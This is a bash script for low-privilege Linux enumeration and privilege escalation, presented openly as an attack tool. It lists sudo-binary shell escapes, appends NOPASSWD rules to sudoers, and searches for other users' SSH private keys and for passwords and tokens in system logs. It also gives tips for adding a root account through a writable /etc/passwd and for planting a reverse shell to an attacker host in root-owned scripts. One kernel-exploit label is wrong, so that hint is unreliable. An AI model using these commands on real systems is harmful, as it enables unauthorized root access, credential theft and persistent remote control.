#!/bin/bash

# Define log file
LOG_FILE="ultimate_enum.log"

# Clear previous log
> "$LOG_FILE"

echo "[*] Running low-privilege enumeration script..."
echo "[*] Results will be saved in $LOG_FILE"

# ------------------- SYSTEM ENUMERATION -------------------

echo -e "\n[+] Host Information:" | tee -a "$LOG_FILE"
echo "Hostname: $(hostname)" | tee -a "$LOG_FILE"
echo "OS: $(uname -s) $(uname -r) $(uname -v)" | tee -a "$LOG_FILE"
echo "Architecture: $(uname -m)" | tee -a "$LOG_FILE"

KERNEL_VERSION=$(uname -r)
echo -e "\n[+] Kernel and CPU Information:" | tee -a "$LOG_FILE"
echo "Kernel Version: $KERNEL_VERSION" | tee -a "$LOG_FILE"

# ------------------- PRIVILEGE ESCALATION CHECKS -------------------

echo -e "\n[+] Checking Sudo Capabilities:" | tee -a "$LOG_FILE"
SUDO_CMDS=$(sudo -l 2>/dev/null)

if [[ -z "$SUDO_CMDS" ]]; then
    echo "[-] No sudo privileges detected." | tee -a "$LOG_FILE"
else
    echo "$SUDO_CMDS" | tee -a "$LOG_FILE"

    # 🔥 Expanded list of exploitable sudo binaries
    declare -A SUDO_EXPLOITS=(
        ["find"]="sudo find . -exec /bin/sh \\; -quit"
        ["vim"]="sudo vim -c ':!/bin/sh'"
        ["tar"]="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        ["python3"]="sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
        ["perl"]="sudo perl -e 'exec \"/bin/sh\";'"
        ["awk"]="sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        ["nmap"]="sudo nmap --interactive; !sh"
        ["less"]="sudo less /etc/passwd; !sh"
        ["nano"]="sudo nano /etc/sudoers"
        ["cp"]="sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh"
        ["tee"]="echo \"user ALL=(ALL) NOPASSWD:ALL\" | sudo tee -a /etc/sudoers"
        ["bash"]="sudo bash"
        ["sh"]="sudo sh"
    )

    for CMD in "${!SUDO_EXPLOITS[@]}"; do
        if [[ "$SUDO_CMDS" == *"$CMD"* ]]; then
            echo -e "[!] Exploitation Tip:\n- Run: ${SUDO_EXPLOITS[$CMD]}\n  -> This will escalate to root.\n" | tee -a "$LOG_FILE"
        fi
    done
fi

# ------------------- KERNEL EXPLOIT SUGGESTIONS -------------------

echo -e "\n[+] Checking for Known Kernel Exploits Based on Version:" | tee -a "$LOG_FILE"
case "$KERNEL_VERSION" in
    *"5.4.0"*)
        echo "[!] Possible Kernel Exploit: Use-After-Free in io_uring (CVE-2021-3493)" | tee -a "$LOG_FILE"
        echo -e "[!] Exploitation Tip:\n- Download and compile an exploit:\n  gcc exploit.c -o exploit\n  ./exploit\n  -> If successful, this grants root access.\n" | tee -a "$LOG_FILE"
        ;;
esac

# ------------------- LATERAL MOVEMENT CHECKS -------------------

echo -e "\n[+] Checking for Other Users' Readable Home Directories:" | tee -a "$LOG_FILE"
READABLE_DIRS=$(find /home -maxdepth 1 -type d -perm -o+r 2>/dev/null)
if [[ -n "$READABLE_DIRS" ]]; then
    echo "$READABLE_DIRS" | tee -a "$LOG_FILE"
    echo -e "[!] Exploitation Tip:\n- Readable home directories may contain sensitive data.\n  Try: ls -la /home/user1/\n" | tee -a "$LOG_FILE"
fi

echo -e "\n[+] Searching for Other Users' SSH Private Keys:" | tee -a "$LOG_FILE"
SSH_KEYS=$(find /home -type f -name "id_rsa" -o -name "*.pem" 2>/dev/null)
if [[ -n "$SSH_KEYS" ]]; then
    echo "$SSH_KEYS" | tee -a "$LOG_FILE"
    echo -e "[!] Exploitation Tip:\n- Use the SSH key to log in as another user:\n  ssh -i id_rsa user1@target-machine\n" | tee -a "$LOG_FILE"
fi

# ------------------- CREDENTIAL DISCOVERY -------------------

echo -e "\n[+] Checking logs for sensitive information (passwords, tokens, API keys):" | tee -a "$LOG_FILE"
CRED_LOGS=$(grep -rniE "password|passwd|token|apikey|secret" /var/log 2>/dev/null)
if [[ -n "$CRED_LOGS" ]]; then
    echo "$CRED_LOGS" | tee -a "$LOG_FILE"
    echo -e "[!] Exploitation Tip:\n- Use leaked passwords or API keys for access:\n  ssh dev@target-machine\n  curl -H \"Authorization: Bearer <API_KEY>\" https://api.target.com\n" | tee -a "$LOG_FILE"
fi

# ------------------- PRIVILEGE ESCALATION VIA FILE PERMISSIONS -------------------

echo -e "\n[+] Checking if /etc/passwd is Writable (Privilege Escalation Risk):" | tee -a "$LOG_FILE"
if [[ -w "/etc/passwd" ]]; then
    echo "[!] /etc/passwd is writable!" | tee -a "$LOG_FILE"
    echo -e "[!] Exploitation Tip:\n- Add a new root user:\n  echo 'hacker:x:0:0:hacker:/root:/bin/bash' >> /etc/passwd\n  su hacker\n" | tee -a "$LOG_FILE"
fi

# ------------------- ROOT-OWNED WRITABLE SCRIPTS -------------------

echo -e "\n[+] Searching for writable root-owned scripts:" | tee -a "$LOG_FILE"
WRITABLE_SCRIPTS=$(find /usr/local/bin /usr/bin /bin /sbin -type f -perm -002 -user root 2>/dev/null)
if [[ -n "$WRITABLE_SCRIPTS" ]]; then
    echo "$WRITABLE_SCRIPTS" | tee -a "$LOG_FILE"
    echo -e "[!] Exploitation Tip:\n- Modify a root-owned script to execute malicious commands:\n  echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /usr/local/bin/backup.sh\n" | tee -a "$LOG_FILE"
fi

# ------------------- ENUMERATION COMPLETED -------------------
echo -e "\n[+] Enumeration completed. Check results in: $LOG_FILE"
